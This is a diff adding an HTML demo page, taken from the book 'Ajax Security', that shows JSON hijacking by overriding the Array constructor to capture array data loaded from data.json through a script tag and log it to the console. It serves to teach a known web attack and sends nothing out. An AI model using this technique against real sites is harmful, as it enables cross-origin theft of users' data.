@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JSON Hijacking with a function constructor</title>
+</head>
+<body>
+<h1>JSON Hijacking with a function constructor</h1>
+<p>As described in the book "Ajax Security".</p>
+
+<script>
+  function Array() {
+    var self = this;
+    var log = function () {
+      console.log("Captured Array: ", self);
+    };
+    setTimeout(log, 100);
+  }
+</script>
+
+<script type="text/javascript" src="./data.json"></script>
+
+</body>
+</html>
